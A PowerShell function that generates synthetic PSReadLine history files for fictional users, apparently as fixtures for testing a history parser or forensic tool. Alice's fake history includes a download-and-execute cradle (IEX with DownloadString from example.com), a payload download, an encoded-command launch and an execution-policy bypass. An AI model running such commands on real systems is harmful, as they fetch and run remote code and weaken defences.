<#
.SYNOPSIS
    Builds a synthetic "Users" tree with PSReadLine history files for testing.
    All content is fictional; domains use example.com (RFC 2606).

    Layout (relative to <Root>/Users):
      alice/  Windows-style path, CRLF line endings, multi-line command
      bob/    Linux-style path, two history files (console + VS Code host)
      carol/  profile with no history at all
      dave/   UTF-8 BOM, blank lines, non-ASCII text
#>
function New-FakePSHistoryProfiles {
    [CmdletBinding()]
    param([Parameter(Mandatory)][string]$Root)

    $noBom = New-Object System.Text.UTF8Encoding($false)
    $bom = New-Object System.Text.UTF8Encoding($true)
    $users = [System.IO.Path]::Combine($Root, 'Users')

    function Write-Fixture {
        param([string]$Dir, [string]$Name, [string[]]$Lines, [string]$NewLine, $Encoding)
        New-Item -ItemType Directory -Path $Dir -Force | Out-Null
        $path = [System.IO.Path]::Combine($Dir, $Name)
        [System.IO.File]::WriteAllText($path, (($Lines -join $NewLine) + $NewLine), $Encoding)
        $path
    }

    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host 'synthetic'"))

    $aliceDir = [System.IO.Path]::Combine($users, 'alice', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadLine')
    $alice = Write-Fixture -Dir $aliceDir -Name 'ConsoleHost_history.txt' -NewLine "`r`n" -Encoding $noBom -Lines @(
        'Get-Process',
        'Get-ChildItem C:\Temp -Recurse',
        'Invoke-WebRequest https://example.com/payload.txt -OutFile C:\Temp\p.txt',
        'IEX (New-Object Net.WebClient).DownloadString(''https://example.com/a.ps1'')',
        "powershell.exe -NoProfile -EncodedCommand $encoded",
        'Get-Service |`',
        '  Where-Object Status -eq ''Running'' |`',
        '  Select-Object -First 5',
        'Set-ExecutionPolicy Bypass -Scope Process'
    )

    $bobDir = [System.IO.Path]::Combine($users, 'bob', '.local', 'share', 'powershell', 'PSReadLine')
    $bobConsole = Write-Fixture -Dir $bobDir -Name 'ConsoleHost_history.txt' -NewLine "`n" -Encoding $noBom -Lines @(
        'ls -la',
        'git status',
        'Enter-PSSession -ComputerName srv01.example.com'
    )
    $bobCode = Write-Fixture -Dir $bobDir -Name 'Visual Studio Code Host_history.txt' -NewLine "`n" -Encoding $noBom -Lines @(
        '$x = 1 + 1',
        ('Write-Host "h' + [char]0x00E9 + 'llo ' + [char]0x65E5 + [char]0x672C + [char]0x8A9E + '"')
    )

    New-Item -ItemType Directory -Path ([System.IO.Path]::Combine($users, 'carol', 'Documents')) -Force | Out-Null

    $daveDir = [System.IO.Path]::Combine($users, 'dave', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadLine')
    $dave = Write-Fixture -Dir $daveDir -Name 'ConsoleHost_history.txt' -NewLine "`n" -Encoding $bom -Lines @(
        'whoami /all',
        '',
        'hostname',
        '',
        ('Write-Host "' + [char]0x00FC + 'n' + [char]0x00EF + 'code ' + [char]0x2713 + '"')
    )

    @{
        UsersRoot        = $users
        AliceFile        = $alice
        BobConsoleFile   = $bobConsole
        BobCodeFile      = $bobCode
        DaveFile         = $dave
        ExpectedUsers    = @('alice', 'bob', 'dave')
        ExpectedFiles    = 4
        ExpectedCommands = 15   # alice 7 + bob 3 + bob(vscode) 2 + dave 3
    }
}
